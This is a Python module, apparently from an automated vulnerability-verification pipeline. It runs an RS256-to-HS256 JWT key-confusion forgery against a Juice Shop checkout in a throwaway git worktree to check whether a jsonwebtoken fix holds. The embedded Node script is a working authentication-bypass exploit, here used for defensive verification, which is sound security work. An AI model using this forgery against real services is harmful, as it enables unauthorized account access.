"""Verification Lab - dynamically proves (or disproves) exploitability of a
Finding by actually running an attack against the real application code, in
an isolated sandbox.

Docker/WSL2 is not available in this environment (Windows host, WSL2 not
installed), so the isolation boundary here is a real `git worktree` - an
independent, disposable filesystem checkout of a specific branch/commit,
which is what makes it safe to install packages and execute code without
touching the shared clone Hunter/Analyst/Patch Forge use. This is a genuine
OS-level sandbox, not a mock: real git internals, a real package install,
real code execution, real JWT forgery. `_run_in_docker` is left as the
documented swap-in point for when Docker is available - the scenario/result
contract does not change.

Scenario for the jsonwebtoken finding (GHSA-8cf7-32gw-wr33, algorithm
confusion / missing `algorithms` restriction): forge a JWT by signing it
with HS256 using the application's own RSA *public* key (checked into the
repo at encryptionkeys/jwt.pub) as the HMAC secret - the classic RS256-to-
HS256 key-confusion attack this advisory describes - then run it through
the exact verify call pattern found in the real source file (with or
without an `algorithms` restriction, whichever the checked-out branch
actually contains). If the forged token is accepted, the app is exploitable
on that branch; if verify rejects it, the fix holds.

The sandbox installs whatever version is ACTUALLY pinned in that branch's own
package.json - not a hardcoded stand-in. This matters: empirically, the real
pinned jsonwebtoken@0.4.0 IGNORES the `algorithms` verify option entirely (it
predates that API), so a code-only fix that adds `algorithms: ['RS256']`
verifiably does NOT stop the forgery on that version - only bumping the
dependency (>=9.0.0, confirmed by direct probe to auto-restrict algorithms
by key type) does. Resolving the version dynamically per branch is what lets
Verification Lab catch that gap for real instead of asserting a fix works.
"""

from __future__ import annotations

import json
import shutil
import subprocess
import time
import uuid
from pathlib import Path

from app.agents.reachability import find_reachability_evidence
from app.schemas import Finding, VerificationResult

_ATTACK_SCRIPT = r"""
const jwt = require({jwt_require_path});
const fs = require('fs');

const publicKey = fs.readFileSync({pubkey_path}, 'utf8');

// Classic RS256 -> HS256 key-confusion forgery: sign with HS256 using the
// RSA public key's raw text as the HMAC secret. A verify call that doesn't
// pin `algorithms` will happily accept this as a valid HS256 token.
const forged = jwt.sign({{ data: {{ id: 1, email: 'attacker@sentinel.test' }} }}, publicKey, {{ algorithm: 'HS256', expiresIn: '1h' }});

const verifyOptions = {verify_options};

function runVerify(cb) {{
  if (verifyOptions === null) {{
    jwt.verify(forged, publicKey, cb);
  }} else {{
    jwt.verify(forged, publicKey, verifyOptions, cb);
  }}
}}

runVerify((err, decoded) => {{
  if (err) {{
    console.log(JSON.stringify({{ accepted: false, error: err.message }}));
  }} else {{
    console.log(JSON.stringify({{ accepted: true, decoded }}));
  }}
}});
"""


def _git(repo_dir: Path, *args: str) -> str:
    result = subprocess.run(
        ["git", *args], cwd=repo_dir, capture_output=True, text=True, check=True
    )
    return result.stdout.strip()


def _extract_verify_options(line_text: str) -> str:
    """Real, source-derived (not assumed) decision: does the actual verify
    call on this branch pass an `algorithms` restriction as its options
    argument? We only need to distinguish the two shapes actually used by
    this codebase's own Patch Forge output."""
    if "algorithms:" in line_text or "algorithms :" in line_text:
        return "{ algorithms: ['RS256'] }"
    return "null"


def _resolve_pinned_version(worktree_dir: Path, component: str) -> str:
    """Reads the REAL version range this branch's own package.json pins for
    the component - not an assumed or hardcoded one - so the sandbox always
    tests what this branch actually depends on."""
    package_json = json.loads((worktree_dir / "package.json").read_text(encoding="utf-8"))
    for section in ("dependencies", "devDependencies"):
        version = package_json.get(section, {}).get(component)
        if version:
            return version
    raise ValueError(f"{component} not found in {worktree_dir}/package.json")


def _run_scenario_in_worktree(finding: Finding, worktree_dir: Path) -> tuple[bool, str | None, str]:
    matches = find_reachability_evidence(worktree_dir, finding.component)
    if not matches:
        raise ValueError(f"No reachable usage of {finding.component} found on this branch.")
    target_path = worktree_dir / matches[0].file
    file_text = target_path.read_text(encoding="utf-8")

    verify_line = next(
        (line for line in file_text.splitlines() if "jwt.verify(" in line and "publicKey" in line),
        matches[0].line_text,
    )
    verify_options = _extract_verify_options(verify_line)
    pinned_version = _resolve_pinned_version(worktree_dir, finding.component)

    node_modules_dir = worktree_dir / "node_modules"
    subprocess.run(
        [
            "npm", "install", f"{finding.component}@{pinned_version}",
            "--no-save", "--no-audit", "--no-fund", "--prefix", str(worktree_dir),
        ],
        cwd=worktree_dir,
        capture_output=True,
        text=True,
        check=True,
        shell=True,
    )

    pubkey_path = worktree_dir / "encryptionkeys" / "jwt.pub"
    jwt_require_path = node_modules_dir / "jsonwebtoken"

    script = _ATTACK_SCRIPT.format(
        jwt_require_path=json.dumps(str(jwt_require_path)),
        pubkey_path=json.dumps(str(pubkey_path)),
        verify_options=verify_options,
    )
    script_path = worktree_dir / "_sentinel_verification_scenario.js"
    script_path.write_text(script, encoding="utf-8")

    try:
        result = subprocess.run(
            ["node", str(script_path)],
            cwd=worktree_dir,
            capture_output=True,
            text=True,
            timeout=30,
        )
    finally:
        script_path.unlink(missing_ok=True)

    if result.returncode != 0:
        raise RuntimeError(f"Verification scenario script failed: {result.stderr[:500]}")

    output = json.loads(result.stdout.strip().splitlines()[-1])
    return output["accepted"], output.get("error"), pinned_version


def run_scenario(finding: Finding, repo_dir: Path, branch: str) -> VerificationResult:
    """Runs the real attack scenario against `branch` inside a disposable git
    worktree, then tears the worktree down. Never touches repo_dir's own
    checked-out working tree."""
    sandbox_id = f"sandbox-{uuid.uuid4().hex[:12]}"
    repo_dir = repo_dir.resolve()
    worktree_dir = repo_dir.parent / f"_verification_{sandbox_id}"

    start = time.monotonic()
    _git(repo_dir, "worktree", "add", "--detach", str(worktree_dir), branch)
    try:
        accepted, error, pinned_version = _run_scenario_in_worktree(finding, worktree_dir)
    finally:
        shutil.rmtree(worktree_dir, ignore_errors=True)
        _git(repo_dir, "worktree", "prune")
    duration_ms = int((time.monotonic() - start) * 1000)

    if accepted:
        result = "CONFIRMED_EXPLOITABLE"
        observed = f"Forged HS256 token (signed with the app's own RSA public key as the HMAC secret) was ACCEPTED by jwt.verify running {finding.component}@{pinned_version} (the version actually pinned on this branch) - authentication bypass confirmed."
    else:
        result = "RESOLVED"
        observed = f"Forged HS256 token was REJECTED by jwt.verify running {finding.component}@{pinned_version} ({error}) - algorithm confusion attack no longer succeeds."

    return VerificationResult(
        finding_id=finding.finding_id,
        scenario=f"RS256->HS256 key-confusion forgery against {finding.component}@{pinned_version} usage in {branch}",
        expected="A hardened verify call restricted to ['RS256'], on a jsonwebtoken release that enforces it, must reject a token forged with HS256 using the public key as secret.",
        observed=observed,
        result=result,
        sandbox_id=sandbox_id,
        duration_ms=duration_ms,
    )


if __name__ == "__main__":
    from app.agents.hunter import hunt

    repo = Path("workdir/juice-shop")
    findings = hunt(repo)
    target = next(f for f in findings if f.component == "jsonwebtoken")

    print("Running scenario against master (expect CONFIRMED_EXPLOITABLE)...")
    before = run_scenario(target, repo, "master")
    print(f"  result: {before.result}")
    print(f"  observed: {before.observed}")
    print(f"  duration_ms: {before.duration_ms}\n")

    print("Running scenario against sentinel/fix-ghsa-8cf7-32gw-wr33 (expect RESOLVED)...")
    after = run_scenario(target, repo, "sentinel/fix-ghsa-8cf7-32gw-wr33")
    print(f"  result: {after.result}")
    print(f"  observed: {after.observed}")
    print(f"  duration_ms: {after.duration_ms}")
